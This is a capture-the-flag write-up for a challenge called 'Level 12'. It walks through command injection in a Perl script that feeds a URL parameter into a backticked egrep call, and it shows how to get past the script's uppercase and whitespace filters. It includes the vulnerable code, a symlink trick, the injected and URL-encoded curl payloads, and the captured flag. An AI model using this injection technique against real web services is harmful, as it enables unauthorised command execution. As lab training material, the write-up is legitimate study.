# Level 12

We have a perl script that gets the argument from the url, passes it in a multiple regex then pases it in an egrep command

We want to send a payload that will get passed through the regexes

```pl
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
```

The first regex changes all characters to caps and the second one gets rid of the whitespaces so we need a payload that doesn't contain any whitespace and that is in all caps

We will have to execute the getflag command but in all caps so GETFLAG. We need to get it either in a folder in all caps or we need it to be the only GETFLAG file and use a wildcard which will scan all folders and use the found file if it is the only one this we create a fake getflag with a simlink

```bash
ln -s /bin/getflag /tmp/GETFLAG
```

then we want to execute this

```bash
curl 'localhost:4646?x=`/*/GETFLAG>&2`'
```

But we need to encode the url first

```bash
curl 'localhost:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
```

The result appears in the errors of the server and we have access to the error logs of the apache server

```bash
cat /var/log/apache2/error.log
```

**Flag:** g1qKMiRpXf53AWhDaU7FEkczr
